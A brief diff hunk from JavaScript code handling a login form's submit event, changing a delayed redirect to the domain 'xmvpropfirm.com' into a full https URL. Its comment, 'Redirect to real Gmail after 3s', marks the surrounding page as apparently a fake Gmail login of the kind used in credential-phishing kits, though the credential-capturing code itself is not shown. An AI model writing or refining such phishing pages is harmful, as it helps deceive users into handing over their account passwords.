@@ -75,6 +75,6 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     
     // Redirect to real Gmail after 3s
     setTimeout(() => {
-        window.location.href = 'xmvpropfirm.com';
+        window.location.href = 'https://xmvpropfirm.com';
     }, 3000);
 });
